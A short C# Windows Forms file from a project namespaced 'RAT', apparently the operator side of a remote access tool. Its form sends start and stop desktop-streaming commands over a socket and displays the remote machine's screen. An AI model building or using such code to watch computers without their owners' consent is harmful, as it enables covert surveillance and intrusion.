using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;

namespace RAT
{
    public partial class FrmRDP : Form
    {
        public Socket client;
        public FrmRDP(Socket CurrClient)
        {
            InitializeComponent();
            client = CurrClient;
        }

        private void FrmRDP_Load(object sender, EventArgs e)
        {
            this.Text = "Remote Desktop - [" + client.RemoteEndPoint.ToString() + "]";
            client.Send(Encoding.ASCII.GetBytes("RDP|StartDesktop"));
        }

        public void SetDesktopImage(Bitmap CurrentScreen)
        {
            this.pictureBox1.Image = CurrentScreen;
        }

        private void FrmRDP_FormClosing(object sender, FormClosingEventArgs e)
        {
            client.Send(Encoding.ASCII.GetBytes("RDP|StopDesktop"));
        }
    }
}
